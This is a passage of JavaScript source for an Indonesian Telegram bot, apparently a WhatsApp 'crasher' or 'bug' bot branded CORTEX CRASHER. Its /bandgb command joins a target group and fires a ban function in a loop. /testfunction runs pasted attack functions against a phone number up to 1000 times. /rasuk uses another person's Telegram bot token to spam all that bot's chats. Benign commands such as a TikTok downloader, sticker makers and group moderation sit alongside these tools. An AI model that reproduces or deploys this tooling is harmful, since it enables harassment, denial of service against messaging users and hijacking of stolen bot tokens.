        console.error(chalk.red(`❌ Gagal: ${err.message}`));

        let errorMsg = err.message;

        if (errorMsg.includes("already") || errorMsg.includes("exist")) {
            errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
        } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
            errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
        } else if (errorMsg.includes("not-authorized")) {
            errorMsg = "Bot tidak memiliki akses (Not Authorized).";
        }

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>❌ Gagal: ${errorMsg}</b>
`,
            { parse_mode: "HTML" }
        );
    }
});

bot.command("bandgb", checkWhatsAppConnection, checkCooldown, async (ctx) => {
    const input = ctx.message.text || "";
    const args = input.split(" ");
    const inputTarget = args[1];

    if (!inputTarget) {
        return ctx.reply(
            `🪧 *Format:* /bandgb https::/chat.whatsapp.com/Grup\n\n` +
            `*Cara:* Kirim link undangan atau JID grup (contoh: 12345@g.us).`,
            { parse_mode: "Markdown" }
        );
    }

    const inviteCode = extractInviteCode(inputTarget);
    const isJid = inputTarget.includes("@g.us");

    if (!inviteCode && !isJid) {
        return ctx.reply(
            `❌ *Input tidak valid!* Pastikan link undangan atau JID grup benar.`,
            { parse_mode: "Markdown" }
        );
    }

    const photoURL = "https://files.catbox.moe/9iolvj.jpg"; 

    const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        photoURL,
        {
            caption: `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>🔄 Processing...</b>
`,
            parse_mode: "HTML"
        }
    );

    const processMsgId = processMessage.message_id;

    try {
        const target = isJid ? inputTarget : await sock.groupAcceptInvite(inviteCode);

        if (!target) {
            throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
        }

        console.log(chalk.green(`✅ Berhasil mendeteksi target: ${target}`));

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${target}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Target Terdeteksi! ID: ${target}</b>
`,
            { parse_mode: "HTML" }
        );

        // Perbaikan: Try-catch internal agar loop tidak merusak alur status
        for (let i = 0; i < 25; i++) {
            try {
                await BanGroupNewV11(sock, target);
                await BanGroupNewV11(sock, target);
            } catch (innerErr) {
                console.log(chalk.yellow(`Pengiriman Banned Group ${i+1}: ${innerErr.message}`));
            }
        }

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Success! Function executed</b>
`,
            { parse_mode: "HTML" }
        );

    } catch (err) {
        console.error(chalk.red(`❌ Gagal: ${err.message}`));

        let errorMsg = err.message;

        if (errorMsg.includes("already") || errorMsg.includes("exist")) {
            errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
        } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
            errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
        } else if (errorMsg.includes("not-authorized")) {
            errorMsg = "Bot tidak memiliki akses (Not Authorized).";
        }

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>❌ Gagal: ${errorMsg}</b>
`,
            { parse_mode: "HTML" }
        );
    }
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown 
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command('listgrup', checkWhatsAppConnection, async (ctx) => {
    try {
        const groups = await sock.groupFetchAllParticipating();
        const list = Object.values(groups)
            .slice(0, 30)
            .map((g, i) => `${i + 1}. ${g.subject}\n   \`${g.id}\``)
            .join('\n\n');

        await ctx.reply(
            list
                ? `📋 *Grup bot join (${Object.keys(groups).length}):*\n\n${list}\n\n_Pakai JID untuk bug group_`
                : '📋 Bot belum ada di grup manapun.',
            { parse_mode: 'Markdown' }
        );
    } catch (err) {
        await ctx.reply(`❌ Gagal ambil daftar grup: ${err.message}`);
    }
});

// CASE TOOLS
bot.command("dltiktok", checkPremium, async (ctx) => {
    try {
        const args = ctx.message.text.split(" ").slice(1);
        const tiktokUrl = args[0];

        if (!tiktokUrl) {
            return ctx.reply("⎙ Gunakan format:\n/dltiktok <url_tiktok>\n\nContoh:\n/tt https://vm.tiktok.com/abc123");
        }

        if (!/tiktok\.com|vm\.tiktok\.com/.test(tiktokUrl)) {
            return ctx.reply("❌ URL TikTok tidak valid!");
        }

        await ctx.reply("🔄 Sedang mengambil video TikTok...");

        const payload = `url=${encodeURIComponent(tiktokUrl)}`;
        const response = await axios.post(TIKTOK_API_URL, payload, {
            headers: RAPIDAPI_HEADERS,
            timeout: 30000
        });

        const data = response.data;

        if (!data || data.code !== 0 || !data.data) {
            const msg = data?.msg || "Gagal mengambil data video dari TikTok!";
            return ctx.reply(`❌ Error: ${msg}`);
        }

        const video = data.data;
        const videoUrl = video.hdplay || video.play;

        const caption =
            `🎬 <b>TikTok Video Downloader</b>\n\n` +
            `👤 <b>Author:</b> ${video.author?.nickname || "Tidak diketahui"}\n` +
            `📝 <b>Deskripsi:</b> ${video.title || "Tidak ada deskripsi"}\n` +
            `❤️ <b>Likes:</b> ${video.digg_count || 0}\n` +
            `💬 <b>Komentar:</b> ${video.comment_count || 0}\n` +
            `🔁 <b>Bagikan:</b> ${video.share_count || 0}\n` +
            `▶️ <b>Tayang:</b> ${video.play_count || 0}\n` +
            `⏱️ <b>Durasi:</b> ${video.duration || 0} detik\n\n` +
            `🔗 <i>Downloaded via @${ctx.botInfo.username}</i>`;

        if (videoUrl && videoUrl.startsWith("http")) {
            await ctx.replyWithVideo({ url: videoUrl }, { caption, parse_mode: "HTML" });

            const infoTambahan =
                `💡 <b>Info Tambahan:</b>\n` +
                `📸 <b>Cover:</b> ${video.cover || "Tidak tersedia"}\n` +
                `🎵 <b>Musik:</b> ${video.music_info?.title || "Tidak diketahui"}\n` +
                `🎧 <b>Penyanyi:</b> ${video.music_info?.author || "Tidak diketahui"}\n` +
                `🎶 <b>URL Musik:</b> ${video.music_info?.play || "Tidak tersedia"}`;

            await ctx.reply(infoTambahan, { parse_mode: "HTML" });
        } else {
            await ctx.reply("⚠️ Tidak dapat menemukan link video untuk diunduh!");
        }
    } catch (error) {
        console.error("🚨 TikTok Download Error:", error);
        if (error.code === "ECONNABORTED") {
            ctx.reply("⏱️ Waktu koneksi habis! Coba lagi nanti.");
        } else if (error.response) {
            ctx.reply(`❌ Gagal mengambil data dari server (Status ${error.response.status})`);
        } else {
            ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
        }
    }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Apongg", { parse_mode: "Markdown" });

  try {
    
    await ctx.reply(" Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("play", async (ctx) => {
   const text = ctx.message.text.split(" ").slice(1).join(" ")

   if (!text) {
      return ctx.reply("Example: /play AnuBangJmbud")
   }

   try {
      await ctx.reply("⏳ Sedang mencari lagu di Spotify...")

      const { data } = await axios.get(`https://api.nexray.web.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`)

      if (!data.status) {
         return ctx.reply("❌ Lagu tidak ditemukan!")
      }

      const res = data.result

      let caption = `❏ *SPOTIFY - PLAY* ❏

🏷 *Title:* ${res.title}
👤 *Artist:* ${res.artist}
🎧 *Album:* ${res.album}
⏳ *Duration:* ${res.duration}
🎬 *Popularity:* ${res.popularity}
🎉 *Release:* ${res.release_at}
📎 *URL:* ${res.url}`

      await ctx.replyWithPhoto(
         { url: res.thumbnail },
         { caption: caption, parse_mode: "Markdown" }
      )

      await ctx.replyWithAudio(
         { url: res.download_url },
         {
            title: res.title,
            performer: res.artist
         }
      )

   } catch (err) {
      console.log(err)
      ctx.reply("❌ Terjadi kesalahan saat mengambil data.")
   }
});

bot.command('cekemoji', async (ctx) => {
  const reply = ctx.message.reply_to_message;

  // Wajib reply ke pesan yang mengandung emoji premium
  if (!reply) {
    return ctx.reply(
      "<blockquote>⬣━━═⪼ 𝐂𝐞𝐤 𝐄𝐦𝐨𝐣𝐢 ⪻═━━⬣</blockquote>\n" +
      "❌ <b>Cara pakai:</b>\n" +
      "╰┈➤ <b>Reply</b> pesan yang berisi emoji premium\n" +
      "╰┈➤ Lalu ketik <code>/cekemoji</code>\n\n" +
      "<i>Contoh: user kirim emoji premium → kamu reply pesannya dengan /cekemoji</i>\n" +
      "<blockquote>༺━━━━━━━━━━━━━━━༻</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  // Kumpulkan semua entities dari teks maupun caption
  const allEntities = [
    ...(reply.entities || []),
    ...(reply.caption_entities || []),
  ];

  // Filter hanya tipe custom_emoji
  const customEmojis = allEntities.filter((e) => e.type === "custom_emoji");

  if (customEmojis.length === 0) {
    return ctx.reply(
      "<blockquote>⬣━━═⪼ 𝐂𝐞𝐤 𝐄𝐦𝐨𝐣𝐢 ⪻═━━⬣</blockquote>\n" +
      "⚠️ Tidak ditemukan <b>custom emoji premium</b> pada pesan tersebut.\n\n" +
      "<i>Pastikan pesan yang di-reply benar-benar mengandung emoji premium (bukan emoji biasa).</i>\n" +
      "<blockquote>༺━━━━━━━━━━━━━━━༻</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  // Deduplikasi berdasarkan custom_emoji_id
  const seen = new Set();
  const unique = customEmojis.filter((e) => {
    if (seen.has(e.custom_emoji_id)) return false;
    seen.add(e.custom_emoji_id);
    return true;
  });

  // Ambil karakter emoji dari teks asli untuk ditampilkan di format
  const sourceText = reply.text || reply.caption || "";

  // Bangun isi pesan hasil
  let body =
    "<blockquote>⬣━━═⪼ 𝐂𝐔𝐒𝐓𝐎𝐌 𝐄𝐌𝐎𝐉𝐈 𝐅𝐎𝐔𝐍𝐃 ⪻═━━⬣</blockquote>\n\n";

  unique.forEach((e, i) => {
    // Ambil karakter asli dari offset entity di pesan sumber
    const rawChar = sourceText.slice(e.offset, e.offset + e.length) || "✨";

    body +=
      `⌥⌬ <b>Emoji ${i + 1}</b>\n` +
      `   ╰┈➤ <b>ID :</b> <code>${e.custom_emoji_id}</code>\n` +
      `   ╰┈➤ <b>Format Pakai:</b>\n` +
      `<code>&lt;tg-emoji emoji-id="${e.custom_emoji_id}"&gt;${rawChar}&lt;/tg-emoji&gt;</code>\n\n`;
  });

  body +=
    `<blockquote>📊 <b>Total Emoji :</b> ${unique.length}</blockquote>\n` +
    "༺━━━━━━━━━━━━━━━༻";

  return ctx.reply(body, { parse_mode: "HTML" });
});

bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|Apongg",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ proses bang...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss iPhone Apongg `,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekprem", async (ctx) => {
    const userId = ctx.from.id;
    const isPrem = isPremiumUser(userId);
    const premiumUsers = loadPremiumUsers();
    
    let status = isPrem ? '✅ Premium' : '❌ Free User';
    let expired = premiumUsers[userId] || '-';
    let sisaHari = '-';
    
    if (isPrem && premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        const now = moment();
        const diffDays = expiryDate.diff(now, 'days');
        sisaHari = diffDays > 0 ? `${diffDays} hari` : 'Hari ini expired';
    }
    
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 〕
│ ⌬ User : ${user.first_name}
│ ⌬ Username : ${username}
│ ⌬ ID : ${userId}
│ ⌬ Status : ${status}
│ ⌬ Expired : ${expired}
│ ⌬ Sisa Hari : ${sisaHari}
╰────────────
    `, { parse_mode: 'HTML' });
});

// ============ CEK SENDER WHATSAPP ============
bot.command("ceksender", async (ctx) => {
    const chatId = ctx.chat.id;
    
    const status = isWhatsAppConnected ? '✅ Terhubung' : '❌ Tidak Terhubung';
    const number = linkedWhatsAppNumber || 'Belum ada nomor';
    
    let socketInfo = 'Tidak aktif';
    let credsInfo = 'Tidak tersedia';
    
    try {
        if (sock) {
            socketInfo = '✅ Aktif';
            if (sock.authState && sock.authState.creds) {
                const creds = sock.authState.creds;
                const me = creds.me || {};
                const platform = creds.platform || 'Unknown';
                const device = creds.device || 'Unknown';
                
                credsInfo = `📱 Device: ${device}\n💻 Platform: ${platform}`;
                
                if (me && me.id) {
                    const jid = me.id.split(':')[0] || me.id;
                    number = jid;
                }
            }
        }
    } catch (e) {
        socketInfo = '❌ Error';
    }
    
    let pairingNumber = 'Tidak ada';
    if (lastPairingMessage && lastPairingMessage.phoneNumber) {
        pairingNumber = lastPairingMessage.phoneNumber;
    }
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙀𝙉𝘿𝙀𝙍 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 〕
│ ⌬ Status : ${status}
│ ⌬ Socket : ${socketInfo}
│ ⌬ Nomor : ${number}
│ ⌬ Pairing : ${pairingNumber}
│ ⌬ Linked : ${linkedWhatsAppNumber || 'Belum ada'}
│
│ ⌬ Info Creds :
│ ${credsInfo}
╰────────────
    `, { parse_mode: 'HTML' });
});

bot.command("cekall", async (ctx) => {
    const userId = ctx.from.id;
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    
    const isPrem = isPremiumUser(userId);
    const premiumUsers = loadPremiumUsers();
    let statusPrem = isPrem ? '✅ Premium' : '❌ Free User';
    let expired = premiumUsers[userId] || '-';
    let sisaHari = '-';
    
    if (isPrem && premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        const diffDays = expiryDate.diff(moment(), 'days');
        sisaHari = diffDays > 0 ? `${diffDays} hari` : 'Hari ini expired';
    }
    
    const statusSender = isWhatsAppConnected ? '✅ Terhubung' : '❌ Tidak Terhubung';
    let number = linkedWhatsAppNumber || 'Belum ada nomor';
    
    try {
        if (sock && sock.authState && sock.authState.creds && sock.authState.creds.me) {
            const me = sock.authState.creds.me;
            if (me && me.id) {
                number = me.id.split(':')[0] || me.id;
            }
        }
    } catch (e) {}
    
    // RUNTIME
    const runtime = formatRuntime();
    const memory = formatMemory();
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙀𝙈𝙐𝘼 〕
│
├──〔 𝙐𝙎𝙀𝙍 〕
│ ⌬ ID : ${userId}
│ ⌬ Username : ${username}
│ ⌬ Nama : ${user.first_name}
│
├──〔 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 〕
│ ⌬ Status : ${statusPrem}
│ ⌬ Expired : ${expired}
│ ⌬ Sisa : ${sisaHari}
│
├──〔 𝙎𝙀𝙉𝘿𝙀𝙍 〕
│ ⌬ Status : ${statusSender}
│ ⌬ Nomor : ${number}
│
├──〔 𝙎𝙔𝙎𝙏𝙀𝙈 〕
│ ⌬ Runtime : ${runtime}
│ ⌬ Memory : ${memory}
╰────────────
    `, { parse_mode: 'HTML' });
});

bot.command('donate', async (ctx) => {
  const caption = `
<b>╭━━━〔 💖 DONASI PROJECT 💖 〕━━━╮</b>
<b>✨ Halo Kak! ✨</b>
Terima kasih udah mau support <b>Bot Kami</b> 🙏
Setiap donasi kamu sangat berarti buat kami! 💐

<b>━━━━━━━━━━━━━━━━━━━</b>
<b>💳 METODE DONASI</b>
<b>━━━━━━━━━━━━━━━━━━━</b>
📸 <b>QRIS</b> ➜ Scan gambar di atas
💙 <b>DANA</b> ➜ <code>0838-8767-718</code>

<b>━━━━━━━━━━━━━━━━━━━</b>
<i>💌 Sekecil apapun donasimu, itu sangat berarti!
Semoga rezeki kamu dilancarkan & berkah selalu 🤲✨</i>
<b>╰━━━〔 🌟 TERIMA KASIH 🌟 〕━━━╯</b>
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "📤 Kirim Bukti Transfer", url: "https://t.me/abilzyy19" }
      ]
    ]
  };

  try {
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/jp3592.jpg",
      {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: keyboard
      }
    );
  } catch (err) {
    console.error("❌ Gagal kirim QRIS:", err.message);
    ctx.reply("❌ Gagal kirim QRIS donasi bre, coba lagi nanti ya 🙏");
  }
});

bot.command("rasuk", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    if (rasukActive) {
        return ctx.reply("⚠️ Rαsυk sєdαng bєrjαlαn, /rasukstop dυlυ");
    }

    const raw = ctx.message.text.replace(/^\/rasuk(@\S+)?\s*/i, "").trim();
    const sep = raw.indexOf("|");
    if (sep === -1) {
        return ctx.reply("🪧 Fσrmαt: /rasuk <tσkєn> | <pєsαn>");
    }

    const tokenRaw = raw.slice(0, sep).trim();
    const message = raw.slice(sep + 1).trim();

    const token = rasukParseToken(tokenRaw);
    if (!token) {
        return ctx.reply("❌ Tσkєn tidαk vαlid. Fσrmαt: 1234567890:AAA-xxxx");
    }
    if (!message) {
        return ctx.reply("❌ Pєsαn kσsσng");
    }
    if (message.length > 4000) {
        return ctx.reply("❌ Pєsαn mαksimαl 4000 kαrαktєr");
    }

    const botInfo = await rasukGetMe(token);
    if (!botInfo) {
        return ctx.reply("❌ Tσkєn tidαk vαlid αtαυ bσt mαti");
    }

    await rasukClearWebhook(token);
    await sleep(1500);

    const chats = await rasukGetChats(token);
    if (!chats || chats.length === 0) {
        return ctx.reply(`⚠️ Bσt @${botInfo.username} bєlυm pυnyα chαt tєrsimpαn`);
    }

    rasukActive = true;

    const startMsg = await ctx.reply(
        `🔥 Rαsυk αktif\n\n↯ Bσt: @${botInfo.username}\n↯ Tαrgєt: ${chats.length} chαt\n↯ Dєlαy: ${RASUK_DELAY_MS}ms\n\n/rasukstop υntυk bєrhєnti`,
        { parse_mode: "HTML" }
    );

    console.log(`[rasuk] start @${botInfo.username} chats=${chats.length}`);

    rasukLoop(token, botInfo, chats, message)
        .then(async (res) => {
            rasukActive = false;
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                startMsg.message_id,
                undefined,
                `🛑 Rαsυk sєlєsαi\n\n↯ Bσt: @${botInfo.username}\n↯ Tєrkirim: ${res.sent}\n↯ Mαti/blσkir: ${res.dead}\n↯ Єrrσr: ${res.errors}\n↯ Chαt αktif: ${res.alive}`,
                { parse_mode: "HTML" }
            ).catch(() => {});
        })
        .catch((e) => {
            rasukActive = false;
            console.error("[rasuk]", e.message);
            ctx.reply(`❌ Єrrσr: ${e.message}`).catch(() => {});
        });
});

bot.command("rasukstop", checkJoin(), async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    if (!rasukActive) {
        return ctx.reply("🪧 Rαsυk tidαk sєdαng bєrjαlαn");
    }
    rasukActive = false;
    await ctx.reply("🛑 Stσp sinyαl dikirim, mєnυnggυ bαtch sєlєsαi...");
});

bot.command("info", (ctx) => {
  const u = ctx.from;

  const info = `
🪪 <b>Your Profile Info</b>
━━━━━━━━━━━━━━━━━━
👤 Name: ${u.first_name || "-"} ${u.last_name || ""}
🏷 Username: @${u.username || "None"}
🆔 ID: <code>${u.id}</code>
🌐 Language: ${u.language_code || "unknown"}
`;

  ctx.reply(info, { parse_mode: "HTML" });
});

bot.command("gempa", async (ctx) => {
  try {
    const res = await fetch(
      "https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json"
    );
    const data = await res.json();
    const g = data.Infogempa.gempa;

    const info = `
📢 *Latest Earthquake (BMKG)*
📅 Date: ${g.Tanggal}
🕒 Time: ${g.Jam}
📍 Location: ${g.Wilayah}
📊 Magnitude: ${g.Magnitude}
📌 Depth: ${g.Kedalaman}
🌊 Potential: ${g.Potensi}
🧭 Coordinates: ${g.Coordinates}
🗺️ Felt: ${g.Dirasakan || "-"}
`;

    await ctx.reply(info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to fetch earthquake data.");
  }
});
bot.command('cekidch', async (ctx) => {
  const args = ctx.message.text.split(" ");
  
  // Cek input
  if (args.length < 2) return ctx.reply("❌ Format salah! /cekidch <link_channel>");
  
  const link = args[1];

  // Validasi link channel WA
  if (!link.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link channel tidak valid!");
  }

  try {
    // Ambil kode undangan dari link
    const inviteCode = link.split("https://whatsapp.com/channel/")[1];

    // Ambil metadata channel WA via Baileys
    const res = await sock.newsletterMetadata("invite", inviteCode);

    // Format teks hasil
    const teks = `
📡 *Data Channel WhatsApp*
━━━━━━━━━━━━━━━━━━
🆔 *ID:* ${res.id}
📛 *Nama:* ${res.name}
👥 *Total Pengikut:* ${res.subscribers}
📊 *Status:* ${res.state}
✅ *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Belum Verif"}
`;

    // Kirim balasan ke Telegram
    await ctx.reply(teks, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data channel. Pastikan link benar dan WA bot online.");
  }
});

/* =========================================================
 *  STORAGE SETTINGS GRUP
 * ========================================================= */
const settingsPath = './database/settings.json';

function loadSettings() {
  try {
    if (fs.existsSync(settingsPath)) return JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
  } catch (e) {}
  return {};
}

function saveSettings(data) {
  const dir = path.dirname(settingsPath);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(settingsPath, JSON.stringify(data, null, 2));
}

function getGroupSetting(chatId) {
  const s = loadSettings();
  if (!s[chatId]) {
    s[chatId] = { antilink: false, antispam: false, welcome: true, antitoxic: false };
    saveSettings(s);
  }
  return s[chatId];
}

function setGroupSetting(chatId, key, value) {
  const s = loadSettings();
  if (!s[chatId]) s[chatId] = { antilink: false, antispam: false, welcome: true, antitoxic: false };
  s[chatId][key] = value;
  saveSettings(s);
}

/* =========================================================
 *  HELPER ADMIN
 * ========================================================= */
async function isAdmin(ctx, userId = ctx.from.id) {
  try {
    const m = await ctx.getChatMember(userId);
    return ['creator', 'administrator'].includes(m.status);
  } catch { return false; }
}

async function botIsAdmin(ctx) {
  try {
    const me = await ctx.getChatMember(ctx.botInfo.id);
    return ['creator', 'administrator'].includes(me.status);
  } catch { return false; }
}

/* =========================================================
 *  🔗 ANTI LINK
 * ========================================================= */
bot.command("antilink", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const mode = (ctx.match || '').trim().toLowerCase();
  const current = getGroupSetting(ctx.chat.id).antilink;

  if (mode === 'on')  setGroupSetting(ctx.chat.id, 'antilink', true);
  if (mode === 'off') setGroupSetting(ctx.chat.id, 'antilink', false);

  if (!['on', 'off'].includes(mode)) {
    return ctx.reply(
      `<blockquote>🔗 𝐀𝐍𝐓𝐈-𝐋𝐈𝐍𝐊 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒</blockquote>
╭〔 𝑺͒𝒕͢𝒂͠𝒕͒𝒖͢𝒔͠ 〕
│ ⌬ Status : ${current ? '✅ AKTIF' : '❌ NONAKTIF'}
╰────────────
╭〔 𝑪͒𝒂͢𝒓͠𝒂͒  𝑷͢𝒂͠𝒌͒𝒂͢𝒊͠ 〕
│ ⌬ /antilink on  ✅ Aktifkan
│ ⌬ /antilink off ❌ Matikan
╰────────────`,
      { parse_mode: "HTML" }
    );
  }

  const now = getGroupSetting(ctx.chat.id).antilink;
  return ctx.reply(
    now
      ? `🔗✅ <b>Anti-Link DIAKTIFKAN!</b>\n🛡️ Link otomatis dihapus dari grup ini 🚫`
      : `🔗❌ <b>Anti-Link DIMATIKAN!</b>\n📭 Member bebas kirim link sekarang 🔓`,
    { parse_mode: "HTML" }
  );
});

/* =========================================================
 *  🔇 MUTE
 * ========================================================= */
bot.command("mute", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-mute");

  try {
    await ctx.restrictChatMember(target.id, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
      },
    });
    return ctx.reply(
      `<blockquote>🔇 𝐌𝐔𝐓𝐄 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋</blockquote>
